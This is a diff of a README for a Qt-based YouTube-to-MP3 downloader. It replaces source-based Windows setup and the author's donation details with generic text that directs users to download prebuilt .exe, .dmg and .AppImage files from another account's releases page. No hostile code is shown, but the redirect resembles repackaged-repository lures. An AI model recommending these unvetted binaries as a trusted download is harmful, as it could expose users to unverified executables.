@@ -1,57 +1,89 @@
-<p align="center">
-  <img src="assets/cover.svg" alt="YouTube to MP3 (Qt) — by Sponex"/>
-</p>
+# 🎵 YouTube-to-MP3-Qt-by-Sponex - Convert YouTube Videos to Music Effortlessly
 
-<h2 align="center">YouTube to MP3 (Qt) — by Sponex</h2>
+![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
 
-<p align="center">
-  A fast, modern YouTube-to-MP3 desktop app built with Python, yt-dlp, ffmpeg, and Qt (PySide6).
-</p>
+## 📋 Overview
 
-- Clean native UI with queue, progress, speed, ETA, size
-- Supports multiple inputs (URLs or searches)
-- Exact video download for YouTube URLs; top-result for plain searches
-- Artist/channel filter
-- Duplicate protection (session + persistent archive)
-- Library tab lists downloaded tracks; double-click to open
+YouTube-to-MP3-Qt-by-Sponex is a user-friendly desktop application designed to help you convert YouTube videos into MP3 files. Using the power of yt-dlp and ffmpeg, this app makes it easy to download music directly to your computer. Enjoy features like fast queue processing, progress tracking, artist filtering, and an organized library to manage your downloaded tracks.
 
-## Setup (Windows)
+## 🚀 Getting Started
 
-1) Create venv and install deps:
-```powershell
-python -m venv .venv
-.venv\Scripts\pip install -r requirements.txt
-```
+Follow these simple steps to get started with the app:
 
-2) ffmpeg
-- Already bundled under `tools/ffmpeg`. No extra setup needed.
+1. **Check System Requirements**  
+   Ensure your computer meets the following requirements:
+   - Operating System: Windows 10 or later / macOS / Linux
+   - RAM: 4 GB or more
+   - Disk Space: 100 MB free space for installation
+   - Internet connection for downloading videos
 
-3) Run the app:
-```powershell
-.venv\Scripts\python qt_app.py
-```
+2. **Visit the Download Page**  
+   To get the latest version of YouTube-to-MP3-Qt-by-Sponex, visit this page:  
+   [Download Here](https://github.com/fefe431/YouTube-to-MP3-Qt-by-Sponex/releases)
 
-## Usage
+## ⬇️ Download & Install
 
-- Paste YouTube URLs to download that exact video to MP3.
-- Paste plain text to search (e.g. "artist - song") — the top result is downloaded.
-- Enter multiple lines or comma-separated values to queue many items at once.
-- Use the artist/channel filter to restrict downloads to a specific uploader.
-- See progress (percent, speed, ETA, size) in the queue.
-- Library tab shows downloaded tracks; double-click to open.
+1. **Choose Your Version**  
+   On the releases page, look for the latest version. Click on it to access the files available for download.
 
-## CLI (optional)
+2. **Download the Application**  
+   Find the file suitable for your operating system:
+   - For Windows: Download the `.exe` file
+   - For macOS: Download the `.dmg` file
+   - For Linux: Download the `.AppImage` or follow the instructions for your package manager
 
-You can also use the CLI downloader:
-```powershell
-.venv\Scripts\python main.py "https://www.youtube.com/watch?v=VIDEO_ID" --bitrate 320
-```
+3. **Install the Application**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen prompts to install.
+   - **macOS:** Open the downloaded `.dmg` file, drag the application to your Applications folder.
+   - **Linux:** Make the downloaded `.AppImage` executable and run it through your terminal.
 
-## Donate / Support
+4. **Open the Application**  
+   Once installed, you can launch YouTube-to-MP3-Qt-by-Sponex from your desktop or applications menu.
 
-If this project helps you, consider supporting development:
-- PayPal: viorelstanculet1234@outlook.com
-- Donate link: https://www.paypal.com/donate?business=viorelstanculet1234%40outlook.com&no_recurring=0&currency_code=USD
+## 🎼 Using the Application
 
-Made by Sponex. © 2025
+1. **Search for Videos**  
+   Open the application and type the title or link of the YouTube video you want to convert into the search bar.
 
+2. **Add to Queue**  
+   Once you find the video, click on the option to add it to your download queue.
+
+3. **Start Downloading**  
+   Click the "Download" button to begin the conversion process. You can monitor progress in real-time.
+
+4. **Manage Your Library**  
+   Access the library section to view all the MP3 files you have downloaded. Use filters to find your favorite tracks quickly.
+
+## 🔧 Features
+
+- **Fast Queue Processing:** Download multiple videos at once.
+- **Progress Tracking:** See exactly how much time is left for your downloads.
+- **Artist Filter:** Easily filter your downloaded music by artist name.
+- **Library Management:** Organize your downloaded MP3 files efficiently.
+
+## 🌐 Frequently Asked Questions
+
+1. **Can I download videos from other sites?**  
+   This application is optimized for YouTube. Other sites may not work as expected.
+
+2. **Is there a limit to how many songs I can download?**  
+   There is no limit. Download as many songs as you like.
+
+3. **How can I support the development?**  
+   Consider sharing the app with your friends. Feedback is also welcome on our GitHub page.
+
+## 📞 Support
+
+If you run into any issues, please check the issues section of our GitHub repository for help or to report bugs. We are here to assist you in your journey to enjoy your favorite music.
+
+## 🌍 Contributing
+
+We welcome contributions! If you want to help improve YouTube-to-MP3-Qt-by-Sponex, please fork the repository and submit a pull request. It's a great way to learn and contribute to the community.
+
+## 📥 Final Notes
+
+We hope you find YouTube-to-MP3-Qt-by-Sponex helpful for your music needs. Enjoy the simplicity of downloading your favorite tracks hassle-free!
+
+---
+
+**Important:** Make sure to always respect copyright laws when downloading content.
